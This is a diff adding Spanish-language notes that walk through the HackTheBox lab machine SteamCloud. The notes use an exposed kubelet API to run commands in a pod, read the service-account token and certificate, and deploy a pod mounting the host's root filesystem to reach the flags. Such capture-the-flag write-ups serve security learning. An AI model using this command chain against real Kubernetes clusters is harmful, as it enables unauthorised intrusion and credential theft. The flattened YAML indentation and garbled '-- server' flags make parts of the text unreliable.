@@ -109,3 +109,83 @@ Corremos el contenedor de naxsi y lo configuramos para exponer el puerto 8080 de
 ```s
 sudo docker run -e BACKEND_IP=webGOAT -it -p 8080:80 --name naxsi scollazo/naxsi-waf-with-ui
 ```
+
+Notas de hacking a SteamCloud HacktheBox, contenedores de docker.
+El escaneo con nmap, nos trajo el puerto 8443 y 10250, el cual es un API para la gestión de contenedores.
+```s
+nmap 10.129.96.98 --max-retries=0 -T4 -p-
+```
+
+Podemos hacer una consulta al contenedor con 
+```s
+curl https://10.129.96.98:8443/ -k
+curl https://10.129.96.98:10250/pods -k
+```
+
+Utilizaremos kubeletctl para descubrir lo que hay dentro de estos pods, para descargarlo usamos el comando con privilegios:
+```s
+curl -LO
+https://github.com/cyberark/kubeletctl/releases/download/v1.7/kubeletctl_linux_amd64
+chmod a+x ./kubeletctl_linux_amd64
+mv ./kubeletctl_linux_amd64 /usr/local/bin/kubeletctl
+```
+
+Ahora veremos la información dentro de los pods con:
+```s
+kubeletctl --server 10.129.96.98 pods
+```
+
+Ahora necesitaremos saber en que pod podemos ejecutar comandos, para ello tenemos el comando
+```s
+kubeletctl --server 10.129.96.98 scan rce
+```
+
+El resultado nos dice que podemos ejecutar comandos en el pod nginx, y para hacerlo usamos el comando:
+```s
+kubeletctl --server 10.129.96.98 exec "id" -p nginx -c nginx
+```
+PRIVILEGE ESCALATION
+Ahora podemos ver si tenemos acceso a los tokens y certificados y así poder crear una cuenta con permisos altos
+Con los siguientes comandos guardaremos y exportaremos en la variable token el token de la consulta, y con el otro comando guardamos el output en el archivo ca.crt
+```s
+export token=$(kubeletctl --server 10.129.96.98 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx)
+kubeletctl --server 10.129.96.98 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx >> ca.crt
+```
+Nos crearemos un archivo para crear el nuevo contenedor con un archivo f.yml
+```yml
+apiVersion: v1
+kind: Pod
+metadata:
+name: nginxt
+namespace: default
+spec:
+containers:
+- name: nginxt
+image: nginx:1.14.2
+volumeMounts:
+- mountPath: /root
+name: mount-root-into-mnt
+volumes:
+- name: mount-root-into-mnt
+hostPath:
+path: /
+automountServiceAccountToken: true
+hostNetwork: true
+```
+
+Ahora creamos el contenedor con:
+```s
+kubectl --token=$token --certificate-authority=ca.crt -- server=https://10.129.96.98:8443 apply -f f.yaml
+```
+Y listamos para revisar que se haya creado
+```s
+kubectl --token=$token --certificate-authority=ca.crt -- server=https://10.129.96.98:8443 get pods
+```
+Y ahora tendremos acceso a las flags.
+```s
+kubeletctl --server 10.129.96.98 exec "cat /root/home/user/user.txt" -p nginxt -c
+nginxt
+kubeletctl --server 10.129.96.98 exec "cat /root/root/root.txt" -p nginxt -c nginxt
+```
+
+Al final tuve que utilizar la version antes mencionada de kubectl y la reciente del sitio https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/
